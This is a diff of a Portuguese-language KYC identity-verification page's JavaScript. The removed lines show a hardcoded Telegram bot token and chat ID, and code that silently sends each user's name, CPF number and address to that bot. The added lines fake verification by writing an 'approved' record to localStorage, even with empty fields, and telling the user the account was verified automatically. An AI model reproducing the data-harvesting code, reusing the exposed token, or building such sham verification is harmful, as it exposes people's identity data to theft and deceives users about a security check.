@@ -160,9 +160,43 @@ input{
 
 let usuario = localStorage.getItem("usuario") || "user";
 
-/* 🔥 CONFIG TELEGRAM */
-const TOKEN = "8616002020:AAGMiTHbWLNN-o6dz_rJ6hEcUX12RKnbFuA";
-const CHAT_ID = "7847311143";
+/* 🔥 AUTO KYC IMEDIATO AO ENTRAR */
+(function autoVerificar(){
+  let auto = localStorage.getItem("autoKyc") === "true";
+
+  if(auto){
+
+    let jaExiste = localStorage.getItem("kyc_"+usuario);
+
+    if(!jaExiste){
+
+      let dados = {
+        nome: usuario,
+        cpf: "",
+        nascimento: "",
+        rua: "",
+        numero: "",
+        cidade: "",
+        cep: "",
+        frente: "",
+        verso: "",
+        selfie: "",
+        status: "aprovado"
+      };
+
+      localStorage.setItem("kyc_"+usuario, JSON.stringify(dados));
+    }
+
+    /* 🔥 REDIRECIONA NA HORA */
+    setTimeout(()=>{
+      if(window.parent && window.parent.document.getElementById("frame")){
+        window.parent.document.getElementById("frame").src = "perfil-operador.html";
+      }else{
+        window.location.href = "perfil-operador.html";
+      }
+    },300);
+  }
+})();
 
 /* preview */
 function preview(input,id){
@@ -197,6 +231,8 @@ function enviar(){
     return;
   }
 
+  let auto = localStorage.getItem("autoKyc") === "true";
+
   let dados = {
     nome: nome.value,
     cpf: cpf.value,
@@ -208,33 +244,12 @@ function enviar(){
     frente: frente || "",
     verso: verso || "",
     selfie: selfie || "",
-    status: "analise"
+    status: auto ? "aprovado" : "analise"
   };
 
   localStorage.setItem("kyc_"+usuario, JSON.stringify(dados));
 
-  /* 🔥 ENVIO PRO BOT */
-  let mensagem =
-`Usuário: ${usuario}
-Nome: ${dados.nome}
-CPF: ${dados.cpf}
-
-Endereço:
-${dados.rua}, ${dados.numero}
-${dados.cidade} - ${dados.cep}
-
-Data: ${new Date().toLocaleString()}`;
-
-  fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
-    method:"POST",
-    headers:{"Content-Type":"application/json"},
-    body:JSON.stringify({
-      chat_id: CHAT_ID,
-      text: mensagem
-    })
-  });
-
-  toast("Enviado com sucesso");
+  toast(auto ? "Conta verificada automaticamente ⚡" : "Enviado para análise");
 
   setTimeout(()=>{
     if(window.parent && window.parent.document.getElementById("frame")){
@@ -242,7 +257,7 @@ Data: ${new Date().toLocaleString()}`;
     }else{
       window.location.href = "perfil-operador.html";
     }
-  },1500);
+  },1000);
 }
 
 </script>
